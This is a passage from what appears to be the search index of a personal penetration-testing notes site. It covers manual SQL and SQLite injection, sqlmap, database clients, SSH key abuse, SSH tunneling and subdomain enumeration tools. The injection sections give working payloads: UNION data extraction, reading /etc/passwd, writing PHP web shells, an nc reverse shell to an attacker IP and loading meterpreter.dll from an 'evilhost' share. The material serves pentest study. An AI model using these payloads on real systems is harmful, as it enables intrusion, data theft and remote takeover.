columns from a table\na' or '1'='1' union select flag,2,value,4,5 from secret_flag --\n</code></pre> <p>Also, once we know which column is injectable, there are some php functions that can provide us some worthy knowing data:</p> <pre><code>database()\nuser()\nversion()\nsqlite_version()\n</code></pre> <p>Also, interesting payloads for retrieving concatenates values in a UNION based attack:</p> <pre><code>## Extract database names, table names and column names\n\n#Database names\n-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata\n\n#Tables of a database\n-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]\n\n#Column names\n-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]\n</code></pre> <p>And here an example of how to retrieve them:</p> <pre><code># if injectable columns are number 2, 3 and 4 you can display some info from the system\nunion select 1, database(),user(),version(),5\n\n# Extra bonus\n# You can also load a file from the system with\nunion select 1, load_file(/etc/passwd),3,4,5\n\n# and you can try to write to a file in the server\nunion select 1,'example example',3,4,5 into outfile '/var/www/path/to/file.txt'\nunion select 1,'example example',3,4,5 into outfile '/tmp/file.txt'\n\n# and we can combine that with a reverse shell like\nunion select 1,'&lt;?passthru(\"nc -e /bin/sh &lt;attacker IP&gt; &lt;attacker port&gt;\") ?&gt;', 3,4,5 into outfile '/tmp/reverse.php'\n</code></pre>","tags":["pentesting"]},{"location":"sqli-manual-attack/#sqli-blind-attack","title":"SQLi Blind attack","text":"<p>Firstly you need to check the application response to different requests (and/or with false true statements). If you can tell true responses from false responses and validate that the application is processing the boolean values, then you can apply this technique. For that purpose the operator AND is more valuable. </p>","tags":["pentesting"]},{"location":"sqli-manual-attack/#boolean-based","title":"Boolean based","text":"Dictionaries <p>https://github.com/amandaguglieri/dictionaries/blob/main/SQL/error-based</p> <p>user() returns the name of the user currently using the database. substring() returns a substring of the given argument. It takes three parameters: the input string, the position of the substring and its length.</p> <p>Boolean based query:</p> <pre><code>' OR substring(user(), 1, 1) = 'a\n' OR substring(user(), 1, 1) = 'b\n</code></pre> <p>More interesting queries:</p> <pre><code># Database version\n1 and substring(version(), 1, 1) = 4--\n\n# Check that second character of the column user_email for user_name admin from table users is greater than the 'c' character  \n1 and substring((SELECT user_email FROM users WHERE user_name = 'admin'),2,1) &gt; 'c'\n</code></pre>","tags":["pentesting"]},{"location":"sqli-manual-attack/#time-based","title":"Time based","text":"Dictionaries <p>https://github.com/amandaguglieri/dictionaries/blob/main/SQL/time-based</p> <p>Resources</p> <ul> <li>OWASP resources</li> </ul> <p>Vulnerable SQL query:</p> <pre><code>SELECT * from users WHERE username = '[username]' AND password = '[password]';\n</code></pre> <p>Time base query: </p> <pre><code>' OR SLEEP(5) -- '\n</code></pre> <p>Interesting queries: </p> <pre><code>1' AND SUBSTRING(user(), 1, 1 = 'r') sleep(0), sleep(10));#\n</code></pre> <p>Examples of available wait/timeout functions include:</p> <ul> <li><code>WAITFOR DELAY '0:0:10'</code>\u00a0in SQL Server</li> <li><code>BENCHMARK()</code>\u00a0and\u00a0<code>sleep(10)</code>\u00a0in MySQL</li> <li><code>pg_sleep(10)</code>\u00a0in PostgreSQL</li> </ul> <pre><code>\n</code></pre>","tags":["pentesting"]},{"location":"sqli-manual-attack/#extra-bonus-bypassing-quotation-marks","title":"Extra Bonus: Bypassing quotation marks","text":"<p>Sometimes quotation marks get filtered in SQL queries. To bypass that when querying some tablename, maybe we can skip quotation marks by entering tablename directly in HEX values.</p> <p>More bypassing tips:</p> <pre><code># Using mingled upper and lowercase\n\n# Using spaces url encoded\n+\n\n# Using comments\n/**/\n/**\n--\n; --\n; /*\n; //\n\n# Example of bypassing webpages that only displays one value at a time\n1'+uNioN/**/sEleCt/**/table_name,2+fROm+information_schema.tables+where+table_schema?'dvwa'+limit+1,1%23&amp;Submit=Submit#\n</code></pre>","tags":["pentesting"]},{"location":"sqli-manual-attack/#extra-bonus-gaining-a-reverse-shell-from-sql-injection","title":"Extra Bonus: Gaining a reverse shell from SQL injection","text":"<p>Take a wordpress installation that uses a mysql database. If you manage to login into the mysql pannel (/phpmyadmin) as root then you could upload a php shell to the /wp-content/uploads/ folder.</p> <pre><code>Select \"&lt;?php echo shell_exec($_GET['cmd']);?&gt;\" into outfile \"/var/www/https/blogblog/wp-content/uploads/shell.php\";\n</code></pre>","tags":["pentesting"]},{"location":"sqli-manual-attack/#extra-bonus-dual","title":"Extra Bonus: DUAL","text":"<p>The DUAL is a special one row, one column table present by default in all Oracle databases. The owner of DUAL is SYS, but DUAL can be accessed by every user. This is a possible payload for SQLi:</p> <pre><code>'+UNION+SELECT+NULL+FROM+dual--\n</code></pre> <p>Oracle syntax requires the use of FROM, but some queries don't requires any table. For these case we use DUAL. Also Oracle doesn't allow the queries that employ information_schema.tables.</p>","tags":["pentesting"]},{"location":"sqlite/","title":"SQLite injections","text":"","tags":["database","relational","database","SQL"]},{"location":"sqlite/#basic-payloads","title":"Basic payloads","text":"<pre><code># Ensure that the targeted parameter is vulnerable\n1' a' or '1'='1' --\n\n# Determine the number of columns of the query\n1' a' or '1'='1' order by 1 -- //returns all results\n1' a' or '1'='1' order by 2 -- //returns all results\n1' a' or '1'='1' order by 3 -- //returns all results\n1' a' or '1'='1' order by 4 -- //returns all results\n1' a' or '1'='1' order by 5 -- //returns all results\n1' a' or '1'='1' order by 6 -- //returns none\n# Therefore the query contains 5 columns.\n\n# Determine which columns are being returned\n1' a' or '1'='1' UNION SELECT 1,2,3,4,5 -- \n# The table in this demo returned values 1,3,4,5. Value 2 was not returned.\n\n# Extract version of sqlite database\n1' a' or '1'='1' UNION SELECT sqlite_version,NULL,NULL,NULL,NULL -- \n\n# Determine the name and schema of the tables stored in the database.\na' or '1'='1' union select tbl_name,2,3,4,5 from sqlite_master --\n\n# Determine the SQL command used to construct the tables:\na' or '1'='1' union select sql,2,3,4,5 from sqlite_master --\n# In this demo it returned:\n1   CREATE TABLE results (rollno text primary key, email text, name text, marks real, rank integer) 4   5\n1   CREATE TABLE secret_flag (flag text, value text)    4   5\n\n# Retrieve two columns from a table\na' or '1'='1' union select flag,2,value,4,5 from secret_flag --\n</code></pre> <p>Source: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md</p> <pre><code># SQLite comments\n--\n/**/\n\n# SQLite version\nselect sqlite_version();\n\n# String based: Extract database structure\nSELECT sql FROM sqlite_schema\n\n# \\Integer or String based: Extract table name\nSELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'\n\n# \\Integer or String based: Extract column name\nSELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'\n\n# For a clean output\nSELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),\"TEXT\",''),\"INTEGER\",''),\"AUTOINCREMENT\",''),\"PRIMARY KEY\",''),\"UNIQUE\",''),\"NUMERIC\",''),\"REAL\",''),\"BLOB\",''),\"NOT NULL\",''),\",\",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'\n\n# Cleaner output\nSELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');\n\n# \\Boolean: Count number of tables\nand (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) &lt; number_of_table\n\n# \\Boolean: Enumerating table name\n\nand (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number\n\n# \\Boolean:  Extract info\nand (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) &gt; hex('some_char')\n\n# \\Boolean: Extract info (order by)\nCASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) = hex('some_char') THEN &lt;order_element_1&gt; ELSE &lt;order_element_2&gt; END\n\n# \\Boolean: Error based\nAND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END\n\n# \\Time based\nAND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))\n</code></pre>","tags":["database","relational","database","SQL"]},{"location":"sqlite/#remote-command-execution-using-sqlite-command-attach-database","title":"Remote Command Execution using SQLite command - Attach Database","text":"<pre><code>ATTACH DATABASE '/var/www/lol.php' AS lol;\nCREATE TABLE lol.pwn (dataz text);\nINSERT INTO lol.pwn (dataz) VALUES (\"&lt;?php system($_GET['cmd']); ?&gt;\");--\n</code></pre>","tags":["database","relational","database","SQL"]},{"location":"sqlite/#remote-command-execution-using-sqlite-command-load_extension","title":"Remote Command Execution using SQLite command - Load_extension","text":"<pre><code>UNION SELECT 1,load_extension('\\\\evilhost\\evilshare\\meterpreter.dll','DllMain');--\n</code></pre>","tags":["database","relational","database","SQL"]},{"location":"sqlite/#references","title":"References","text":"<p>Injecting SQLite database based application - Manish Kishan Tanwar SQLite Error Based Injection for Enumeration</p>","tags":["database","relational","database","SQL"]},{"location":"sqlmap/","title":"sqlmap - A tool for testing SQL injection","text":"","tags":["pentesting"]},{"location":"sqlmap/#get-parameter","title":"GET parameter","text":"<pre><code>sqlmap -u \u2018http://victim.site/view.php?id=112\u2019 -p id --technique=U\n# -p: to indicate an injectable parameter \n# --technique=U  //to indicate a UNION based SQL injection technique // E: error based  // \n# -b: banner of the database\n# --tor: to use a proxy to connect to the target URL\n# -v3: to see the payloads that sqlmap is using\n# --flush-session: to refresh sessions\n# --tamper: default tampers are in /usr/share/sqlmap/tamper\n</code></pre>","tags":["pentesting"]},{"location":"sqlmap/#post-parameter","title":"POST parameter","text":"<pre><code>sqlmap -u &lt;URL&gt; --data=&lt;POST string&gt; -p parameter [options]\n</code></pre>","tags":["pentesting"]},{"location":"sqlmap/#using-r-file","title":"Using -r file","text":"<p>Capture the request with burpsuite and save it to a file.</p> <pre><code># Get all databases\nsqlmap -r nameoffiletoinject --method POST --data \"parameter=lala\" -p parameter --dbs    \n\n# Get all tables \nsqlmap -r nameoffiletoinject --tables\n\n# Get all columns of a given database dwva\nsqlmap -r nameoffiletoinject --current-db dwva -columns\n\n# Get all tables of a given database, for example dwva\nsqlmap -r nameoffiletoinject -D dwva --tables\n\n# Get all columns of a given table in a given database\nsqlmap -r nameoffiletoinject -D dwva -T users --columns\n\n# Dump users table\nsqlmap -r nameoffiletoinject -D dwva -T users --dump\n\n# Get columns username and password of table users from table dwva\nsqlmap -r nameoffiletoinject -D dwva -T users -C username,password --dump\n\n# Automatically attempt to upload a web shell using the vulnerable parameter and execute it\nsqlmap -r nameoffiletoinject -p vuln-param -os-shell \n\n# Alternatively use the os-pwn option to gain a shell using meterpreter or vnc \nsqlmap -r nameoffiletoinject -p vuln-param -os-pwn \n</code></pre>","tags":["pentesting"]},{"location":"sqlmap/#using-url","title":"Using URL","text":"<p>You can also provide the url with --url or -u</p> <pre><code>sqlmap --url \u2018http://victim.site\u2019  --dbs --batch //\nsqlmap --url \u2018http://victim.site\u2019  --users // gets users\nsqlmap --url \u2018http://victim.site\u2019  --tables // gets all tables\nsqlmap --url \u2018http://victim.site\u2019  --batch //\n\n\n# Check what users we have and which privileges that user has.\nsqlmap -u $IP/path.php --forms --cookie=\"PHPSESSID=v5098os3cdua2ps0nn4ueuvuq6\" --batch --users\n\n# Dump the password hash for an user (postgres in the example) and exploit that super permission.\nsqlmap -u http://10.129.95.174/dashboard.php --forms --cookie=\"PHPSESSID=e14ch3u8gfbq8u3h97t8bqss9o\" -U postgres --password --batch\n\n# Get a shell \nsqlmap -u http://10.129.95.174/dashboard.php --forms --cookie=\"PHPSESSID=e14ch3u8gfbq8u3h97t8bqss9o\" --batch --os-shell                  \n</code></pre>","tags":["pentesting"]},{"location":"sqlmap/#getting-a-direct-sql-shell","title":"Getting a direct SQL Shell","text":"<pre><code># Get a OS shell\nsqlmap --url \u2018http://victim.site\u2019  --os-shell\n\n# GEt a SQL shell\nsqlmap --url \u2018http://victim.site\u2019  --sql-shell\n</code></pre>","tags":["pentesting"]},{"location":"sqlmap/#suffixes-and-preffixes","title":"Suffixes and preffixes","text":"","tags":["pentesting"]},{"location":"sqlmap/#set-a-suffix","title":"Set a suffix","text":"<pre><code>sqlmap -u \"http://example.com/?id=1\"  -p id --suffix=\"-- \"\n</code></pre>","tags":["pentesting"]},{"location":"sqlmap/#prefix","title":"Prefix","text":"<pre><code>sqlmap -u \"http://example.com/?id=1\"  -p id --prefix=\"') \"\n</code></pre>","tags":["pentesting"]},{"location":"sqlmap/#injections-in-headers-and-other-http-methods","title":"Injections in Headers and other HTTP Methods","text":"<pre><code>#Inside cookie\nsqlmap  -u \"http://example.com\" --cookie \"mycookies=*\"\n\n#Inside some header\nsqlmap -u \"http://example.com\" --headers=\"x-forwarded-for:127.0.0.1*\"\nsqlmap -u \"http://example.com\" --headers=\"referer:*\"\n\n#PUT Method\nsqlmap --method=PUT -u \"http://example.com\" --headers=\"referer:*\"\n\n#The injection is located at the '*'\n</code></pre>","tags":["pentesting"]},{"location":"sqlmap/#tampers","title":"Tampers","text":"<pre><code>sqlmap -r request.txt --tamper=space2comment\n# space2comment: changes whitespace to /**/\n</code></pre> Tamper Description apostrophemask.py Replaces apostrophe character with its UTF-8 full width counterpart apostrophenullencode.py Replaces apostrophe character with its illegal double unicode counterpart appendnullbyte.py Appends encoded NULL byte character at the end of payload base64encode.py Base64 all characters in a given payload between.py Replaces greater than operator ('&gt;') with 'NOT BETWEEN 0 AND #' bluecoat.py Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator chardoubleencode.py Double url-encodes all characters in a given payload (not processing already encoded) commalesslimit.py Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M' commalessmid.py Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)' concat2concatws.py Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' charencode.py Url-encodes all characters in a given payload (not processing already encoded) charunicodeencode.py Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded). \"%u0022\" charunicodeescape.py Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded). \"\\u0022\" equaltolike.py Replaces all occurances of operator equal ('=') with operator 'LIKE' escapequotes.py Slash escape quotes (' and \") greatest.py Replaces greater than operator ('&gt;') with 'GREATEST' counterpart halfversionedmorekeywords.py Adds versioned MySQL comment before each keyword ifnull2ifisnull.py Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' modsecurityversioned.py Embraces complete query with versioned comment modsecurityzeroversioned.py Embraces complete query with zero-versioned comment multiplespaces.py Adds multiple spaces around SQL keywords nonrecursivereplacement.py Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace(\"SELECT\", \"\")) filters percentage.py Adds a percentage sign ('%') infront of each character overlongutf8.py Converts all characters in a given payload (not processing already encoded) randomcase.py Replaces each keyword character with random case value randomcomments.py Add random comments to SQL keywords securesphere.py Appends special crafted string sp_password.py Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs space2comment.py Replaces space character (' ') with comments space2dash.py Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\\n') space2hash.py Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n') space2morehash.py Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n') space2mssqlblank.py Replaces space character (' ') with a random blank character from a valid set of alternate characters space2mssqlhash.py Replaces space character (' ') with a pound character ('#') followed by a new line ('\\n') space2mysqlblank.py Replaces space character (' ') with a random blank character from a valid set of alternate characters space2mysqldash.py Replaces space character (' ') with a dash comment ('--') followed by a new line ('\\n') space2plus.py Replaces space character (' ') with plus ('+') space2randomblank.py Replaces space character (' ') with a random blank character from a valid set of alternate characters symboliclogical.py Replaces AND and OR logical operators with their symbolic counterparts (&amp;&amp; and unionalltounion.py Replaces UNION ALL SELECT with UNION SELECT unmagicquotes.py Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) uppercase.py Replaces each keyword character with upper case value 'INSERT' varnish.py Append a HTTP header 'X-originating-IP' versionedkeywords.py Encloses each non-function keyword with versioned MySQL comment versionedmorekeywords.py Encloses each keyword with versioned MySQL comment xforwardedfor.py Append a fake HTTP header 'X-Forwarded-For'","tags":["pentesting"]},{"location":"sqlplus/","title":"sqlplus - To connect and manage the Oracle RDBMS","text":"<p>SQL Plus is a command-line tool that provides access to the Oracle RDBMS. SQLPlus enables you to:</p> <ul> <li>Enter SQLPlus commands to configure the SQLPlus environment.</li> <li>Startup and shutdown an Oracle database.</li> <li>Connect to an Oracle database.</li> <li>Enter and execute SQL commands and PL/SQL blocks.</li> <li>Format and print query results.</li> </ul>","tags":["oracle tns","port 1521","tools"]},{"location":"sqlplus/#connect-to-oracle-database","title":"Connect to Oracle database","text":"<p>If we manage to get some credentials we can connect to the Oracle TNS service with sqlplus.</p> <pre><code>sqlplus &lt;username&gt;/&lt;password&gt;@$ip/XE;\n</code></pre> <p>In case of this error message ( sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory), there might be an issue with libraries. Possible solution:</p> <pre><code>sudo sh -c \"echo /usr/lib/oracle/12.2/client64/lib &gt; /etc/ld.so.conf.d/oracle-instantclient.conf\";sudo ldconfig\n</code></pre>","tags":["oracle tns","port 1521","tools"]},{"location":"sqlplus/#basic-commands","title":"Basic commands","text":"<p>All commands from Oracle's documentation.</p> <pre><code># List all available tables in the current database\nselect table_name from all_tables;\n\n# Show the privileges of the current user\nselect * from user_role_privs;\n</code></pre>","tags":["oracle tns","port 1521","tools"]},{"location":"sqsh/","title":"sqsh","text":"","tags":["database","cheat sheet","mssql"]},{"location":"sqsh/#installation","title":"Installation","text":"<p>Pre-installed in Kali. Used to interact with MSSQL (Microsoft SQL Server) from Linux. </p> <pre><code> # Connect to mssql server\n sqsh -S $IP -U username -P Password123 -h\n # -h: disable headers and footers for a cleaner look.\n\n# When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication.\nsqsh -S $ip -U .\\\\&lt;username&gt; -P 'MyPassword!' -h\n# For windows authentication we can use  SERVERNAME\\\\accountname or .\\\\accountname\n</code></pre> <p>When connected to msSQL, all commands will be executed after the GO command.</p>","tags":["database","cheat sheet","mssql"]},{"location":"ssh-audit/","title":"ssh-audit","text":""},{"location":"ssh-audit/#installation","title":"Installation","text":"<p>Download from github repo: https://github.com/jtesta/ssh-audit.</p> <pre><code>git clone https://github.com/jtesta/ssh-audit.git \n</code></pre>"},{"location":"ssh-audit/#basic-usage","title":"Basic usage","text":"<pre><code>./ssh-audit.py $ip\n</code></pre>"},{"location":"ssh-for-github/","title":"SSH for github","text":""},{"location":"ssh-for-github/#how-to-configure-multiple-two-or-more-deploy-keys-for-different-private-github-repositories-on-the-same-computer-without-using-ssh-agent","title":"How to configure multiple two or more deploy keys for different private github repositories on the same computer without using ssh-agent","text":"<p>Let's say I want to have a ssh key A for repo1 and ssh key b for repo2. </p> <ol> <li>Create a ssh pair keys for each repository</li> </ol> <pre><code>ssh-keygen -t ed25519 -C \"your_email@example.com\"\n# ed25519 is the algorithm\n</code></pre> <p>For the second key and the subsequent ones, you will need to specify a different name.</p> <ul> <li>Private key should have permissions set to 600.</li> <li> <p>.ssh folder should have permissions set to 700.</p> </li> <li> <p>Add your SSH keys to the ssh-agent. In my case </p> </li> </ul> <pre><code># start the ssh-agent in the background\neval \"$(ssh-agent -s)\"\n\n# add your ssh private key to the ssh-agent.\nssh-add ~/.ssh/id_ed25519\n</code></pre> <ol> <li> <p>Add your ssh public keys as deploy keys in the Settings tab of repo1 and repo2 .</p> </li> <li> <p>Edit .git/config file in both repositories.</p> </li> </ol> <pre><code># For repo1\n[remote \"origin\"]\n        url = \"ssh://git@repo1.github.com:username/repo1.git\"\n\n# For repo2\n[remote \"origin\"]\n        url = \"ssh://git@repo2.github.com:username/repo2.git\"\n</code></pre> <ol> <li>For each repo set name and email</li> </ol> <pre><code># navigate to your repo1\ngit config user.name \"yourName1\"\ngit config user.email \"email1@domain.com\"\n\n# navigate to your repo2\ngit config user.name \"name2\"\ngit config user.email \"email2@domain.com\"\n</code></pre> <ol> <li>Create a config file in .ssh to manage keys:</li> </ol> <pre><code># Default github account: username1\nHost github.com/username1\n   HostName github.com\n   IdentityFile ~/.ssh/username1_private_key\n   IdentitiesOnly yes\n\n# Other github account: username2\nHost github.com/username2\n   HostName github.com\n   IdentityFile ~/.ssh/username2_private_key\n   IdentitiesOnly yes\n</code></pre> <ol> <li>Make sure you don't have all credentials cached in your ssh agent</li> </ol> <pre><code>ssh-add -D\n</code></pre> <ol> <li>Add new credentials to your ssh agent</li> </ol> <pre><code>ssh-add ~/.ssh/username1_private_key\nssh-add ~/.ssh/username2_private_key\n</code></pre> <ol> <li>See added keys</li> </ol> <pre><code>ssh-add -l\n</code></pre> <ol> <li>Test your conection</li> </ol> <pre><code>ssh -T git@github.com\n</code></pre>"},{"location":"ssh-keys/","title":"SSH keys","text":"","tags":["pentesting","privilege escalation","linux"]},{"location":"ssh-keys/#read-access-to-ssh","title":"Read access to .ssh","text":"<p>Having read access over the .ssh directory for a specific user, we may read their private ssh keys found in /home/user/.ssh/id_rsa or /root/.ssh/id_rsa, and we can copy it to our machine and use the -i flag to log in with it:</p> <pre><code>vim id_rsa\nchmod 600 id_rsa\n# If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working.\nssh user@10.10.10.10 -i id_rsa\n</code></pre>","tags":["pentesting","privilege escalation","linux"]},{"location":"ssh-keys/#write-access-to-ssh","title":"Write access to .ssh","text":"<p>Having write access over the .ssh directory for a specific user, we may place our public key in /home/user/.ssh/authorized_keys.</p> <p>But for this we need to have gained access first as that user. With this technique we obtain ssh access to the machine. </p> <pre><code># Generating a public private rsa key pair\nssh-keygen -f key\n</code></pre> <p>This will give us two files:\u00a0<code>key</code>\u00a0(which we will use with\u00a0<code>ssh -i</code>) and\u00a0<code>key.pub</code>, which we will copy to the remote machine.</p> <p>Let us copy\u00a0<code>key.pub</code>, then on the remote machine, we will add it into\u00a0<code>/root/.ssh/authorized_keys</code>:</p>","tags":["pentesting","privilege escalation","linux"]},{"location":"ssh-tunneling/","title":"SSH tunneling","text":""},{"location":"ssh-tunneling/#local-port-forwarding","title":"Local port forwarding","text":"<p>In this example we will use this tunneling as a way to access locally to a remote postgresql service: </p> <ol> <li>In the attacking machine:</li> </ol> <pre><code>ssh UserNameInTheAttackedMachine@IPOfTheAttackedMachine -L 1234:localhost:5432 \n# We will listen for incoming connections on our local port 1234. When a client connects to our local port, the SSH client will forward the connection to the remote server on port 22. This allows the local client to access services on the remote server as if they were running on the local machine.\n# We are forwarding traffic from any given local port, for instance 1234, to the port on which PostgreSQL is listening, namely 5432, on the remote server. We therefore specify port 1234 to the left of localhost, and 5432 to the right, indicating the target port.\n</code></pre> <ol> <li>In another terminal in the attacking machine:</li> </ol> <pre><code>sudo apt update &amp;&amp; sudo apt install postgresql postgresql-client-common \n# this will install postgresql in case you don't have it.\n\npsql -U christine -h localhost -p 1234\n# Using our installation of psql, we can now interact with the PostgreSQL service running locally on the target machine:\n# -U: to specify user.\n# -h: to specify localhost. \n# -p 1234 as we are targeting the tunnel we created earlier with SSH, we need to specify which is the port the tunnel is listening on.\n</code></pre>"},{"location":"ssh-tunneling/#dynamic-port-forwarding","title":"Dynamic Port Forwarding","text":"<p>Unlike local port forwarding and remote port forwarding, which use a specific local and remote port (earlier we used 1234 and 5432, for instance), dynamic port forwarding uses a single local port and dynamically assigns remote ports for each connection.</p> <p>To use dynamic port forwarding with SSH, you can use the ssh command with the -D option, followed by the local port, the remote host and port, and the remote SSH server. For example, the following command will forward traffic from the local port 1234 to the remote server on port 5432, where the PostgreSQL server is running:</p> <pre><code>ssh UserNameInTheAttackedMachine@IPOfAttackedMachine -D 1234 \n# -f send the command to the shell's background right before executing it remotely\n# -N tells SSH not to execute any commands remotely.\n</code></pre> <p>As you can see, this time around we specify a single local port to which we will direct all the traffic needing forwarding. </p> <p>If we now try running the same psql command as before, we will get an error. That is because this time around we did not specify a target port for our traffic to be directed to, meaning psql is just sending traffic into the established local socket on port 1234, but never reaches the To make use of dynamic port forwarding, a tool such as proxychains is especially useful. </p> <p>In summary and as the name implies, proxychains can be used to tunnel a connection through multiple proxies; a use case for this could be increasing anonymity, as the origin of a connection would be significantl more difficult to trace. </p> <p>In our case, we would only tunnel through one such \"proxy\"; the target machine. The tool is pre-installed on most pentesting distributions (such as ParrotOS and Kali Linux ) and is highly customisable, featuring an array of strategies for tunneling, which can be tampered with in itis configuration file /etc/proxychains4.conf.</p> <p>The minimal changes that we have to make to the file for proxychains to work in our current use case is to:</p> <ol> <li>Ensure that strict_chain is not commented out; ( dynamic_chain and random_chain should be commented out)</li> <li>At the very bottom of the file, under [ProxyList], we specify the socks5 (or socks4 ) host and port that we used for our tunnel</li> </ol> <p>In our case, it would look something like this, as our tunnel is listening at localhost:1234.  PostgreSQL service on the target machine.</p> <pre><code>[ProxyList]\n# add proxy here ...\n# meanwile\n# defaults set to \"tor\"\n#socks4 127.0.0.1 9050\nsocks5 127.0.0.1 1234\n</code></pre> <p>Having configured proxychains correctly, we can now connect to the PostgreSQL service on the target, as if we were on the target machine ourselves! This is done by prefixing whatever command we want to run with proxychains:</p> <pre><code>proxychains psql -U NameOfUserOfAttackedMachine -h localhost -p 5432\n</code></pre>"},{"location":"sshpass/","title":"sshpass - A program to pass passwords in the command line to ssh","text":"<p>sshpass is a program that allows us to pass passwords in the command line to ssh. This way we can automate the login process.</p>","tags":["tools"]},{"location":"sshpass/#installation","title":"Installation","text":"<pre><code>sudo apt install sshpass\n</code></pre>","tags":["tools"]},{"location":"sshpass/#usage","title":"Usage","text":"<pre><code>sshpass -p 'thepasswordisthis' ssh user@IP\n</code></pre>","tags":["tools"]},{"location":"sslyze/","title":"sslyze - A tool for scanning certificates","text":"<p>Analyze the SSL/TLS configuration of a server by connecting to it, in order to ensure that it uses strong encryption settings (certificate, cipher suites, elliptic curves, etc.), and that it is not vulnerable to known TLS attacks (Heartbleed, ROBOT, OpenSSL CCS injection, etc.).</p>","tags":["pentesting","web pentesting"]},{"location":"sslyze/#installation","title":"Installation","text":"<p>Preinstalled in kali.</p> <p>Download it from: https://github.com/nabla-c0d3/sslyze.</p>","tags":["pentesting","web pentesting"]},{"location":"sslyze/#basic-usage","title":"Basic usage","text":"<pre><code>sslyze --certinfo &lt;DOMAIN&gt;\n</code></pre> <p>In order not to have false positive regarding hostname validation, use the domain (not IP).</p>","tags":["pentesting","web pentesting"]},{"location":"subbrute/","title":"SubBrute","text":"<p>SubBrute is a community driven project with the goal of creating the fastest, and most accurate subdomain enumeration tool. Some of the magic behind SubBrute is that it uses open resolvers as a kind of proxy to circumvent DNS rate-limiting (https://www.us-cert.gov/ncas/alerts/TA13-088A). This design also provides a layer of anonymity, as SubBrute does not send traffic directly to the target's name servers.</p> <p>This tool allows us to use self-defined resolvers and perform pure DNS brute-forcing attacks during internal penetration tests on hosts that do not have Internet access.</p>","tags":["pentesting","dns","enumeration","tools"]},{"location":"subbrute/#installation","title":"Installation","text":"<pre><code>git clone https://github.com/TheRook/subbrute.git &gt;&gt; /dev/null 2&gt;&amp;1\ncd subbrute\n</code></pre>","tags":["pentesting","dns","enumeration","tools"]},{"location":"subbrute/#basic-commands","title":"Basic commands","text":"<pre><code>echo \"ns1.inlanefreight.com\" &gt; ./resolvers.txt\n\n./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt\n</code></pre>","tags":["pentesting","dns","enumeration","tools"]},{"location":"subfinder/","title":"Subfinder","text":"<p><code>subfinder</code>\u00a0is a subdomain discovery tool that returns valid subdomains for websites, using passive online sources. It has a simple, modular architecture and is optimized for speed.\u00a0<code>subfinder</code>\u00a0is built for doing one thing only - passive subdomain enumeration, and it does that very well.</p> <p>This tool can scrape subdomains from open sources like\u00a0DNSdumpster. </p>","tags":["pentesting","dns","enumeration","tools"]},{"location":"subfinder/#installation","title":"Installation","text":"<p>Repo: https://github.com/projectdiscovery/subfinder </p> <pre><code>sudo apt install subfinder\n</code></pre>","tags":["pentesting","dns","enumeration","tools"]},{"location":"subfinder/#basic-commands","title":"Basic commands","text":"<pre><code>subfinder -d inlanefreight.com -v\n</code></pre>","tags":["pentesting","dns","enumeration","tools"]},{"location":"sublist3r/","title":"sublist3r - A subdomain enumerating tool","text":"<p>Sublist3r enumerates subdomains using many search engines such as Google, Yahoo, Bing, Baidu and Ask. Sublist3r also enumerates subdomains using Netcraft, Virustotal, ThreatCrowd, DNSdumpster and ReverseDNS. Easily blocked by Google.</p>","tags":["scanning","subdomains","reconnaissance","pentesting"]},{"location":"sublist3r/#installation","title":"Installation","text":"<pre><code>git clone https://github.com/aboul3la/Sublist3r\ncd sublist3r\nsudo pip install -r requirements.txt\n</code></pre>","tags":["scanning","subdomains","reconnaissance","pentesting"]},{"location":"sublist3r/#usage","title":"Usage","text":"<p>From sublist3r directory:</p> <pre><code>python3 sublist3r.py -d example.com -o file.txt\n# -d: Specify the domain.\n# -o file.txt: It prints the results to a file\n# -b: Enable the bruteforce module. This built-in module relies on the names.txt wordlist. To find it, use: locate names.txt (you can edit it).\n\n# Select an engine for enumeration, for instance, google.\npython3 sublist3r.py -d example.com -e 